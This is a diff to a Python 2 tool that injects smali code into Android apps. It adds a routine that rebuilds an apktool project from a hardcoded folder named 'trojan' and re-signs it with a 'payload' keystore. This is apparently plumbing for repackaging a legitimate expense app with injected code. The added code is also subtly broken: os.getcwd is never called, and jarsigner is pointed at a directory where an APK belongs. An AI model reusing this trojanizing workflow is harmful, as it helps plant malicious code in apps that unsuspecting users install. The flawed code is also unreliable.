@@ -1,5 +1,8 @@
 import re
 import argparse
+import subprocess
+import sys
+import os
 
 
 
@@ -89,15 +92,15 @@ class Utilities:
 			return_file_content = file.read()
 			file.close()
 		except Exception as e:
-			self.print_color('[!] Error: Cannot open the file: ' +file_name ,'red')
+			self.print_color('(!) Error: Cannot open the file: ' +file_name ,'red')
 			self.print_color(str(e),'red')
 		return return_file_content
 	def write_smali_file(self,file_name, original, insert_array):
 		if file_name:
-			self.print_color('[+] Writing file at location: ' +file_name ,'green')
+			self.print_color('(+) Writing file at location: ' +file_name ,'green')
 		else:
 			file_name = "./output.smali"
-			self.print_color('[+] Writing file to default location: ' +file_name ,'green')
+			self.print_color('(+) Writing file to default location: ' +file_name ,'green')
 		orcounter = 0;
 		with open(file_name,"w") as file:
 			for line in original:
@@ -107,6 +110,32 @@ class Utilities:
 				file.write(line + "\n")
 				orcounter +=1
 			file.close()
+	def compile_smali_path(self):
+		print "(-0-) Building the injected SMALI"
+		command = ["apktool", "--version"]
+		p = subprocess.Popen(command, stdout=subprocess.PIPE)
+		sub_response = p.communicate()[0]
+		if '.' not in sub_response:
+			self.print_color('(!) APKTOOL Was not found, INSTALL APKTOOL 2 AND ADD TO PATH ' ,'red')
+			sys.exit()
+		cwd = os.getcwd
+		build_command =  ["apktool","b","/users/rortega/Desktop/ExpenseManage/Android/trojan/base/"]
+		print cwd
+		stringJarSignerCommand=["jarsigner", "-keystore", "./payload/mykey.keystore", "/users/rortega/Desktop", "alias_name", "-sigalg", "MD5withRSA", "-digestalg", "SHA1"]
+		print "[*] EXECUTING APKTOOL BUILD COMMAND..."
+		p = subprocess.Popen(build_command, stdout=subprocess.PIPE)
+		build_result = p.communicate()[0]
+		print "[*] EXECUTING JARSIGNER COMMAND..."
+		p = subprocess.Popen(stringJarSignerCommand, stdout=subprocess.PIPE)
+		jarsignerResult = p.communicate()[0]
+		print jarsignerResult
+
+
+
+
+
+
+
 
 
 	def __init__(self):
@@ -164,9 +193,11 @@ class Main:
 		try:
 			# Print application banner
 			if args.file:
+				utilities.print_color('(_*_) Injecting the provided SMALI','blue')
 				self._process_smali_file()
 			elif args.compile_sign:
-				utilities.print_color('[+] Compiling an','blue')
+				utilities.print_color('(+) Compiling an','blue')
+				utilities.compile_smali_path()
 
 
 		except KeyboardInterrupt:
